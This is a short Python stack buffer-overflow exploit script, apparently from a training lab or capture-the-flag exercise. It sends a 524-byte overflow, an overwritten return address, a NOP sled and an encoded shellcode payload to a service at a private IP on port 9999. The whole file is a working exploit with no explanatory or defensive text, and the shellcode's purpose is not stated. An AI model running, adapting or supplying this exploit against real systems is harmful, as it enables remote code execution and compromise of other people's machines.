import socket
import os

ip = "10.10.173.1"
port = 9999

# bad chars = \x0a

prefix = ""
offset = 524
overflow = "A" * offset
retn = "\xf3\x12\x17\x31"
padding = "\x90" * 16
payload = (
  "\xd9\xca\xd9\x74\x24\xf4\x5a\x31\xc9\xb1\x52\xbd\xf7\x70\x63"
  "\x69\x83\xea\xfc\x31\x6a\x13\x03\x9d\x63\x81\x9c\x9d\x6c\xc7"
  "\x5f\x5d\x6d\xa8\xd6\xb8\x5c\xe8\x8d\xc9\xcf\xd8\xc6\x9f\xe3"
  "\x93\x8b\x0b\x77\xd1\x03\x3c\x30\x5c\x72\x73\xc1\xcd\x46\x12"
  "\x41\x0c\x9b\xf4\x78\xdf\xee\xf5\xbd\x02\x02\xa7\x16\x48\xb1"
  "\x57\x12\x04\x0a\xdc\x68\x88\x0a\x01\x38\xab\x3b\x94\x32\xf2"
  "\x9b\x17\x96\x8e\x95\x0f\xfb\xab\x6c\xa4\xcf\x40\x6f\x6c\x1e"
  "\xa8\xdc\x51\xae\x5b\x1c\x96\x09\x84\x6b\xee\x69\x39\x6c\x35"
  "\x13\xe5\xf9\xad\xb3\x6e\x59\x09\x45\xa2\x3c\xda\x49\x0f\x4a"
  "\x84\x4d\x8e\x9f\xbf\x6a\x1b\x1e\x6f\xfb\x5f\x05\xab\xa7\x04"
  "\x24\xea\x0d\xea\x59\xec\xed\x53\xfc\x67\x03\x87\x8d\x2a\x4c"
  "\x64\xbc\xd4\x8c\xe2\xb7\xa7\xbe\xad\x63\x2f\xf3\x26\xaa\xa8"
  "\xf4\x1c\x0a\x26\x0b\x9f\x6b\x6f\xc8\xcb\x3b\x07\xf9\x73\xd0"
  "\xd7\x06\xa6\x77\x87\xa8\x19\x38\x77\x09\xca\xd0\x9d\x86\x35"
  "\xc0\x9e\x4c\x5e\x6b\x65\x07\x6b\x61\x6a\xe0\x03\x7b\x74\x1f"
  "\x88\xf2\x92\x75\x20\x53\x0d\xe2\xd9\xfe\xc5\x93\x26\xd5\xa0"
  "\x94\xad\xda\x55\x5a\x46\x96\x45\x0b\xa6\xed\x37\x9a\xb9\xdb"
  "\x5f\x40\x2b\x80\x9f\x0f\x50\x1f\xc8\x58\xa6\x56\x9c\x74\x91"
  "\xc0\x82\x84\x47\x2a\x06\x53\xb4\xb5\x87\x16\x80\x91\x97\xee"
  "\x09\x9e\xc3\xbe\x5f\x48\xbd\x78\x36\x3a\x17\xd3\xe5\x94\xff"
  "\xa2\xc5\x26\x79\xab\x03\xd1\x65\x1a\xfa\xa4\x9a\x93\x6a\x21"
  "\xe3\xc9\x0a\xce\x3e\x4a\x2a\x2d\xea\xa7\xc3\xe8\x7f\x0a\x8e"
  "\x0a\xaa\x49\xb7\x88\x5e\x32\x4c\x90\x2b\x37\x08\x16\xc0\x45"
  "\x01\xf3\xe6\xfa\x22\xd6"
)
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  s.send(bytes(buffer + "\n", "latin-1"))
  #s.recv(1024)
  s.close()
except:
  print("Could not connect.")
